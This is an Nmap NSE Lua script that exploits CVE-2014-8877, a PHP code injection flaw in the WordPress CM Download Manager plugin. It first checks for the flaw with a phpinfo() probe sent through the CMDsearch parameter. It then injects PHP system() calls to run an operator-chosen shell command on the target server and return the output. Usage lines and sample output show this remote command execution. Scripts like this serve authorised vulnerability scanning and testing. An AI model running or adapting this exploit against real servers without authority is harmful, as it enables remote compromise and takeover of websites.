local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local url = require "url"
local vulns = require "vulns"

description = [[
Exploits a remote code injection vulnerability (CVE-2014-8877) in Wordpress CM Download Manager plugin. Versions <= 2.0.0 are known to be affected.

CM Download Manager plugin does not correctly sanitise the user input which allows remote attackers to execute arbitrary PHP code via the CMDsearch parameter to cmdownloads/, which is processed by the PHP 'create_function' function.

The script injects PHP system() function into the vulnerable target in order to execute specified shell command.
]]

---
-- @usage
-- nmap --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami", http-vuln-cve2014-8877.uri="/wordpress" <target>
-- nmap --script http-vuln-cve2014-8877 <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2014-8877:
-- |   VULNERABLE:
-- |   Code Injection in Wordpress CM Download Manager plugin
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2014-8877
-- |       CM Download Manager plugin does not correctly sanitise the user input
-- |       which allows remote attackers to execute arbitrary PHP code via the
-- |       CMDsearch parameter to cmdownloads/, which is processed by the PHP
-- |       'create_function' function.
-- |
-- |     Disclosure date: 2014-11-14
-- |     Exploit results:
-- |       Linux debian 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
-- |     References:
-- |       http://www.itas.vn/news/code-injection-in-cm-download-manager-plugin-66.html?language=en
-- |_      https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8877
--
-- @args http-vuln-cve2014-8877.uri Wordpress root directory on the website. Default: /
-- @args http-vuln-cve2014-8877.cmd Command to execute. Default: nil
---

author = "Mariusz Ziulek <mzet()owasp org>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}

portrule = shortport.http

function genHttpReq(host, port, uri, cmd)
  local payload = nil
  local vulnPath = '/cmdownloads/?CMDsearch='

  if cmd ~= nil then
    payload = cmd
  else
    payload = '".phpinfo(1)."'
  end

  local finalUri = uri..vulnPath..url.escape(payload)
  local req = http.get(host, port, finalUri)

  stdnse.debug(1, string.format("Sending GET '%s' request", uri..vulnPath..payload))

  return req
end

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil

  local req = genHttpReq(host, port, uri, nil)
  stdnse.debug1("Sent First request")
  -- check if target is vulnerable
  if req.status == 200 and string.match(req.body, "PHP Version %d%.%d") ~= nil then
    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = 'Code Injection in Wordpress CM Download Manager plugin',
      state = vulns.STATE.NOT_VULN,
      description = [[
CM Download Manager plugin does not correctly sanitise the user input
which allows remote attackers to execute arbitrary PHP code via the
CMDsearch parameter to cmdownloads/, which is processed by the PHP
'create_function' function.
      ]],
      IDS = {CVE = 'CVE-2014-8877'},
      references = {
          'http://www.itas.vn/news/code-injection-in-cm-download-manager-plugin-66.html?language=en',
          'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8877',
      },
      dates = {
          disclosure = {year = '2014', month = '11', day = '14'},
      },
    }
    stdnse.debug1("A check was used to see if phpinfo() works or not. It did work.")
    vuln.state = vulns.STATE.EXPLOIT

    local rand = stdnse.generate_random_string(7)
    -- exploit the vulnerability
    if cmd ~= nil then
       -- wrap cmd with pattern which is used to filter out only relevant output from the response
       req = genHttpReq(host, port, uri, '".system("echo ' .. rand .. '").system('..cmd..').system("echo ' .. rand .. '")."')
       if req.status == 200 then
         -- take first lazy match as command output
         local cmdOut = nil
         for m in string.gmatch(req.body, rand .. '\n(.-)\n' .. rand) do
           cmdOut = m
           break
         end

         if cmdOut ~= nil then
           vuln.exploit_results = cmdOut
         end
       end
    end

    return vulnReport:make_output(vuln)
  end
end

